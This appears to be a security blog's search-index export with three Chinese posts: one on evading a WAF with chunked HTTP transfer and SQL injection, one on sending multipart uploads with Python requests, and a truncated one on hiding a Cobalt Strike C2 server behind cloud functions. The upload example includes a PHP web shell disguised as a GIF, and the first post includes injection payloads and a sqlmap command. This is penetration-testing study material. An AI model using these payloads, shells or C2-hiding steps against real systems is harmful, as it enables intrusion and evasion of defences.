<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>绕waf之分块传输技术</title>
      <link href="post/20220932133.html"/>
      <url>post/20220932133.html</url>
      
        <content type="html"><![CDATA[<h1 id="绕waf之分块传输技术"><a href="#绕waf之分块传输技术" class="headerlink" title="绕waf之分块传输技术"></a>绕waf之分块传输技术</h1><h2 id="1-分块传输理论知识"><a href="#1-分块传输理论知识" class="headerlink" title="1. 分块传输理论知识"></a>1. 分块传输理论知识</h2><p>分块传输绕waf技术已经公开好几年，学习后作此总结。</p><p>HTTP/1.1中引入了分块传输编码的数据传输机制，允许客户端将请求体分块再传输，这得益于HTTP/1.1的长连接机制，分块传输的本意是为了提高效率，如将数据分块后再传输可以对每个数据块单独操作（如压缩解压缩、计算、整合等），而不需要等所有数据发送或接收完毕后再操作，大大节约时间空间成本。</p><p>分块传输的数据格式：<br>请求响应头不需要指定Content-Length，但是需要加入Transfer-Encoding: chunked来表明本数据包使用分块传输；同时数据体分割为一系列数据块，每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括自己的结尾（rn），也不包括分块数据结尾的；最后一个分块长度值必须为 0，对应的分块数据没有内容（两个空行），表示实体结束。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">4</span><br><span class="line">abcd</span><br><span class="line">3</span><br><span class="line">abc</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时也可以在长度后加入注释内容，使用分号来表示注释开始</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">4;注释</span><br><span class="line">abcd</span><br><span class="line">3;zhushi1111111111111111</span><br><span class="line">abc</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上述规则对数据进行分块传输，wireshark抓包看到http请求中的分块传输数据，长度与Burp中编码后的一致</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140047866.png" alt="image-20220828235548476"></p><p>对data做16进制转字符也能得到原始数据</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140047895.png" alt="image-20220828235503535"></p><h2 id="2-分块传输实践"><a href="#2-分块传输实践" class="headerlink" title="2. 分块传输实践"></a>2. 分块传输实践</h2><h3 id="2-1-分块传输过安全狗"><a href="#2-1-分块传输过安全狗" class="headerlink" title="2.1 分块传输过安全狗"></a>2.1 分块传输过安全狗</h3><p>这里用的安全狗（Apache服务器版）V4.0.18089进行测试，需要配置打开SQL注入的POST拦截</p><p>直接注入被拦截：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140047306.png" alt="image-20220828123803752"></p><p>对数据进行分块传输，不再拦截</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048299.png" alt="image-20220828125023064"></p><p>查当前用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2+and+extractvalue(1,concat(0x7e,(select+user()),0x7e))--+&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p>拦截</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048708.png" alt="image-20220828161548867"></p><p>分块传输，不拦截</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048344.png" alt="image-20220828161327563"></p><p>当然也可以加入注释，即在每一个数据块大小后加入<code>;注释字符</code>，用来绕过检测分块传输的waf，不过早在几年前也已经被过滤了</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048662.png" alt="image-20220828162322392"></p><h3 id="2-2-SQLMap联动分块传输插件"><a href="#2-2-SQLMap联动分块传输插件" class="headerlink" title="2.2 SQLMap联动分块传输插件"></a>2.2 SQLMap联动分块传输插件</h3><p>需要用到BurpSuite分块传输插件<a href="http://github.com/c0ny1/chunked-coding-converter">chunked-coding-converter</a>，将SQLMap的流量代理到BurpSuite，BurpSuite中chunked-coding-converter config设置为Proxy自动分块</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048018.png" alt="image-20220907231044077"></p><p>此时只要是通过代理走BurpSuite的流量都会被分块传输</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -r E:\Desktop\req.txt --batch --proxy http://127.0.0.1:8080 --dbs</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048929.png" alt="image-20220828163554689"></p><p>可以在Burp Logger中看到大量从SQLMap中过来的数据包，被插件进行分块传输编码，绕过waf注入</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048620.png" alt="image-20220828164002974"></p><h3 id="2-3-延时分块传输"><a href="#2-3-延时分块传输" class="headerlink" title="2.3 延时分块传输"></a>2.3 延时分块传输</h3><p>在普通分块传输、带注释污染数据的分块传输均已经被主流waf拼接数据后进行防护拦截，又出现了绕过方法，即延时分块。</p><p>延时分块绕过的原理是在原有分块传输的基础上每个分块加入延时，用以增加安全设备的等待时间，当等待时间超过安全设备的资源设定时间时，出于性能和业务的考量，安全设备会提前终止数据的接收拼接，即可实现脏数据的插入。当然块与块之间发送的时延必须要小于后端中间件的timeout，Tomcat默认是20s,weblogic是30s。</p><p>延时分块的实际利用同样可以使用BurpSuite分块传输插件<a href="http://github.com/c0ny1/chunked-coding-converter">chunked-coding-converter</a>，c0ny1表哥在之前工具的基础上已经加入了延时功能，可设置分块长度以及每个分块的延时时间，并且会显示预计的分块数量和总耗时，配置好即可start进行延时注入</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048906.png" alt="image-20220828215154250"></p><p>所有分块发送完毕后在response处查看结果。</p><h2 id="3-个人疑点之分块传输深度探究"><a href="#3-个人疑点之分块传输深度探究" class="headerlink" title="3. 个人疑点之分块传输深度探究"></a>3. 个人疑点之分块传输深度探究</h2><p>看完分块传输技术以及分块传输绕过waf的文章，当然不仅仅指的是本文，不知道你是否有以下疑惑：</p><ol><li><strong>客户端发送一个分块编码的http请求，为什么服务端就会分块接收？</strong></li><li><strong>整个分块的数据请求还是同一个http包发送接收的，为什么能够边发送边接收、边计算、边整合？</strong></li><li><strong>底层究竟是如何分块发送、接收的？</strong></li></ol><p>我在网上查了一些文章，但始终没有查到这部分内容，大都直接讲分块传输的几大好处如边传输边压缩、边传输边计算等，因此无法彻底理解分块传输的原理、过程、效果，索性抓包探究一下。</p><p>这里使用Wiresshark抓包，动图演示一下分块传输的数据包过程，为了更直观此处使用的延时分块</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048721.gif" alt="GIF 2022-9-8 1-54-35"></p><p>可以看到，每进行一次分块数据传输，就会发送几条对应的TCP请求响应包，看似是POST包，其实是传输层TCP层的数据包，只是Wireshark为了方便查看这样展示的，追踪TCP流后就会显示正常。</p><p>对分块传输的数据包分析如下图：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048001.png" alt="image-20220908020937087"></p><p><strong>第一步：</strong>点击发送以后，首先进行TCP的三次握手，随即用2个TCP包分别发送http请求的首行（请求行）和请求头+第一个数据块。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048982.png" alt="image-20220908104346863"></p><p><strong>第二步：</strong>用2个TCP请求实现一个数据块的传输，第一个TCP发送数据块大小，第二个TCP发送数据块内容。</p><p>原本的TCP MTU为1460，但是可以看到由于进行分块编码传输，所以每个包都没发满传输单元</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048318.png" alt="image-20220908104833270"></p><p><strong>第三步：</strong>当所有分块数据都用步骤二发送完毕时，再发送一个数据结束标识符，即0\r\n\r\n，Wireshark进行了可视化组装，所以要在HTTP请求中看。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202209140048622.png" alt="image-20220908144153726"></p><p>这样一次分块传输的数据就发送完成了。</p><p>这样看来Wireshark中显示的HTTP数据包其实是自己组装起来展示的，因为它监听的是网卡数据，而发包时数据流向是自顶向下，即应用层-&gt;传输层-&gt;网络层-&gt;数据链路层-&gt;物理层，Wireshark接收到所有数据后进行组装，来做可视化展示。</p><p>经过以上实操学习，总结起来，个人的疑虑无非用一句话解释：<strong>分块传输发生在TCP传输层，HTTP应用层只负责提供格式和组装格式。</strong>因此在BurpSuite上看似点了一次Send，发了一个数据包，其实传输层才是对接收到的应用层数据进行分块处理的，因为TCP协议负责数据的分组和组装。</p><p>正因为如此，分块传输才能绕waf，当然现在来看也只能是绕过包过滤类型的防火墙，因为这种防火墙检测的是TCP、UDP、ICMP等网络层、传输层的数据包内容，不像应用代理防护墙，检测的是应用层的数据包内容。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/videring/articles/7420485.html">HTTP协议之chunk编码(分块传输编码)</a></p><p><a href="https://blog.csdn.net/qq_40734247/article/details/108043739">HTTP首部——分块传输和持久连接</a></p><p><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输 | 回忆飘如雪</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分块传输 </tag>
            
            <tag> 绕waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3使用requests模块发送FormData文件类型请求</title>
      <link href="post/20220862133.html"/>
      <url>post/20220862133.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python3使用requests模块发送FormData文件类型请求"><a href="#Python3使用requests模块发送FormData文件类型请求" class="headerlink" title="Python3使用requests模块发送FormData文件类型请求"></a>Python3使用requests模块发送FormData文件类型请求</h1><p>多次脚本编写过程中，遇到请求体是FormData文件类型的请求，对如何使用Python3的requests模块来发送该类型请求，做简单记录。</p><p>假设需要发送如下的请求数据：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839246.png" alt="image-20220816005751072"></p><p>有三种方法</p><ol><li>手动构造requests.post请求体传参</li><li>使用requests.post的files参数</li><li>使用requests_toolbelt的MultipartEncoder模块</li></ol><p>但首先得了解一下文件格式multipart/form-data的请求包。</p><h2 id="1-multipart-form-data格式简述"><a href="#1-multipart-form-data格式简述" class="headerlink" title="1. multipart/form-data格式简述"></a>1. multipart/form-data格式简述</h2><p>post请求中必须有Content-Type请求头，用于表示本次post数据的格式，基于post请求方式发送数据的有多种格式，用于不同的环境：</p><ul><li>application/x-www-form-urlencoded：原生post，键值对，简单的请求数据</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /test.html HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=admin&amp;pass=123456</span><br></pre></td></tr></table></figure><ul><li>application/json：原生post基础上，json形式，传递复杂键值对数据</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /test.html HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;users&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;user&quot;: &quot;admin&quot;,</span><br><span class="line">            &quot;pass&quot;: &quot;123456&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>multipart/form-data：上传文件的默认格式，使用–boundary分割每一个表单数据，–boundary–作为所有数据结尾</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /test.html HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=6bb4837eb74329105ee4568dda7dc67ed2ca2ad9</span><br><span class="line"></span><br><span class="line">--6bb4837eb74329105ee4568dda7dc67ed2ca2ad9</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">--6bb4837eb74329105ee4568dda7dc67ed2ca2ad9</span><br><span class="line">Content-Disposition: form-data; name=&quot;pass&quot;</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">--6bb4837eb74329105ee4568dda7dc67ed2ca2ad9--</span><br></pre></td></tr></table></figure><ul><li>……</li></ul><p>如上，multipart/form-data格式的文件类型表单数据，看似与原生post请求不同，其实multipart/form-data的请求体也是字符串，只不过是有特定的请求头（Content-Type: multipart/form-data; boundary=–boundary）和特殊的请求体构造方式（–boundary分割数据，–boundary–结尾）的字符串，这是与基础post请求（name1=value1&amp;name2=value2……）不同的地方，因此在做数据处理中，请求响应均可将其按照post字符串处理。</p><h2 id="2-构造post请求体传参"><a href="#2-构造post请求体传参" class="headerlink" title="2. 构造post请求体传参"></a>2. 构造post请求体传参</h2><p>和之前使用基础post请求格式一样，手动构造特定格式的请求体作为data参数，进行传参</p><p>需要指定Content-Type，且其值也必须规定为multipart/form-data，同时指定一个boundary用于分割数据，burp0_data定义为为所有参数的字符串格式，requests.post中指定data为burp0_data</p><p>注意：有结构的post请求体burp0_data内容必须顶格，存在缩进会导致解析失败</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_post</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://1.116.192.238:5555/Pass-01/index.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=---------------------------420857334818915960412654596244&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    burp0_data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">-----------------------------420857334818915960412654596244</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1234567.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/gif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GIF89a</span></span><br><span class="line"><span class="string">&lt;?php @syStem($_GET[&quot;pwd&quot;]);?&gt;</span></span><br><span class="line"><span class="string">-----------------------------420857334818915960412654596244</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------420857334818915960412654596244--</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxie)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓包效果如下：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839997.png" alt="image-20220823003208861"></p><p>可成功上传，解析</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839987.png" alt="image-20220816010132902"></p><p>适用情况：有条件抓取现成的测试包，或者可从浏览器复制，否则手动构造这样的请求包并非明智之举。</p><h2 id="3-requests-post的files参数"><a href="#3-requests-post的files参数" class="headerlink" title="3. requests.post的files参数"></a>3. requests.post的files参数</h2><p>requests.post的files参数可直接发送文件类型格式的请求，files参数的数据定义格式有2种，字典格式和列表元组格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#123;&quot;name&quot;: fileObj&#125; 字典</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file1&quot;</span>: (<span class="built_in">open</span>(<span class="string">&quot;./file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;file1&quot;</span>: (<span class="string">&quot;123.php&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/gif&quot;</span>),   <span class="comment"># 指定文件名、文件类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># [(&quot;name&quot;, fileObj)] 列表元组</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="string">&quot;file1&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;/Downloads/hello.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)),</span><br><span class="line">    (<span class="string">&quot;file2&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;/Downloads/hello2.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>需要注意的是，<strong>files参数内只能填入待上传的文件，不能传入普通参数</strong>，当上传文件的同时还有其它参数需要赋值，可同时使用requests的data参数指定普通参数，类型为字典。</p><p>错误的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;upload_file&quot;</span>: (<span class="string">&quot;123.php&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/gif&quot;</span>),</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;上传&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, files=files)</span><br></pre></td></tr></table></figure><p>因为没有指定filename，因此自动将submit设定为filename，不符合预期的单纯传参</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839405.png" alt="image-20220824003245563"></p><p>正确的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;upload_file&quot;</span>: (<span class="string">&quot;123.php&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/gif&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;上传&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, files=files, data=data)</span><br></pre></td></tr></table></figure><p>files和data参数搭配使用，即可实现上传文件同时对普通参数赋值。可成功上传解析。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839202.png" alt="image-20220824003023382"></p><p>适用情况：无法或难以抓包，直接利用模块生成相关数据包。</p><p>但是这种方法无法发送全都是普通参数的文件格式数据包，如下</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839825.png" alt="image-20220826164020226"></p><p>上图请求中所有参数都是普通参数，但是使用multipart/form-data的文件格式进行传参，这种情况就需要用到第三种方法——第三方库requests_toolbelt的MultipartEncoder模块。</p><h2 id="4-MultipartEncoder模块"><a href="#4-MultipartEncoder模块" class="headerlink" title="4. MultipartEncoder模块"></a>4. MultipartEncoder模块</h2><p>第三方库requests_toolbelt可以看作是requests的请求工具扩展，其中的MultipartEncoder模块专门用于生成multipart/form-data表单数据，需手动安装才能使用</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests_toolbelt</span><br></pre></td></tr></table></figure><p>requests_toolbelt官方文档：</p><p><a href="https://toolbelt.readthedocs.io/en/latest/user.html">https://toolbelt.readthedocs.io/en/latest/user.html</a></p><p>MultipartEncoder模块官方示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt.multipart.encoder <span class="keyword">import</span> MultipartEncoder</span><br><span class="line"></span><br><span class="line">m = MultipartEncoder(</span><br><span class="line">    fields=&#123;<span class="string">&#x27;field0&#x27;</span>: <span class="string">&#x27;value&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;field1&#x27;</span>: <span class="string">&#x27;value&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field2&#x27;</span>: (<span class="string">&#x27;filename&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;file.py&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;text/plain&#x27;</span>)&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://httpbin.org/post&#x27;</span>, data=m,</span><br><span class="line">                  headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: m.content_type&#125;)</span><br></pre></td></tr></table></figure><p>在使用MultipartEncoder初始化一个对象时，需要一个字典参数，字典内的内容与requests.post的files参数类似，不过同时也可以发送普通的非文件数据，参数分别如下：</p><ul><li>发送文件内容：**参数名 : (文件名, 文件内容, 文件类型)**，其中文件名、文件类型均可省略</li><li>发送非文件内容：<strong>参数名 : 参数值</strong></li></ul><p>同时还需要在headers中指定Content-Type为MultipartEncoderObj.content_type，交由模块来自动补全。</p><p>一个完整的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_MultipartEncoder</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://1.116.192.238:5555/Pass-01/index.php&quot;</span></span><br><span class="line">    m = MultipartEncoder(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;upload_file&quot;</span>: (<span class="string">&quot;123.php&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./file.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&quot;image/gif&quot;</span>),</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;上传&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    req_headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: m.content_type,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.post(burp0_url, headers=req_headers, data=m, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>upload_file是文件内容类型参数，submit是普通类型参数</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839324.png" alt="image-20220828084628869"></p><p>使用也可以发送纯普通参数的表单数据请求，同时可将某参数内容置空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">m = MultipartEncoder(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;field1&quot;</span>: <span class="string">&quot;11111&quot;</span>,</span><br><span class="line">        <span class="string">&quot;field2&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;field3&quot;</span>: <span class="string">&quot;33333&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208281839273.png" alt="image-20220828090409016"></p><p>MultipartEncoder模块可以看作是requests.post的files参数的扩展，同时又是对data参数内容格式的自动构造。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python3 requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>踩坑记录之使用云函数隐藏C2地址</title>
      <link href="post/202207122133.html"/>
      <url>post/202207122133.html</url>
      
        <content type="html"><![CDATA[<h1 id="踩坑记录之使用云函数隐藏C2地址"><a href="#踩坑记录之使用云函数隐藏C2地址" class="headerlink" title="踩坑记录之使用云函数隐藏C2地址"></a>踩坑记录之使用云函数隐藏C2地址</h1><p>云函数隐藏C2地址的部署过程跟网络上大同小异，参考的以下文章进行部署，环境为CS4.2：</p><p><a href="https://blog.csdn.net/w1590191166/article/details/113826579">https://blog.csdn.net/w1590191166/article/details/113826579</a></p><p><a href="https://www.cnblogs.com/SeanGyy/p/15614445.html">https://www.cnblogs.com/SeanGyy/p/15614445.html</a></p><p>本文只记录在部署过程中遇到的问题。</p><h2 id="1-坑点总结"><a href="#1-坑点总结" class="headerlink" title="1.坑点总结"></a>1.坑点总结</h2><p>部署过程中的2个踩坑分别是</p><ul><li><p>python3.7默认没安装requests库</p></li><li><p>直接pip3 install requests安装库不生效，需要指定保存位置</p></li></ul><p>均已解决</p><h2 id="2-部署过程"><a href="#2-部署过程" class="headerlink" title="2.部署过程"></a>2.部署过程</h2><h3 id="1-1-坑点1：python3-7默认未安装requests库"><a href="#1-1-坑点1：python3-7默认未安装requests库" class="headerlink" title="1.1 坑点1：python3.7默认未安装requests库"></a>1.1 坑点1：python3.7默认未安装requests库</h3><p>坑点：部署前没有测试，不知道python3.7默认没安装requests库</p><p>使用的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        C2=<span class="string">&#x27;http://12*******10:80&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span 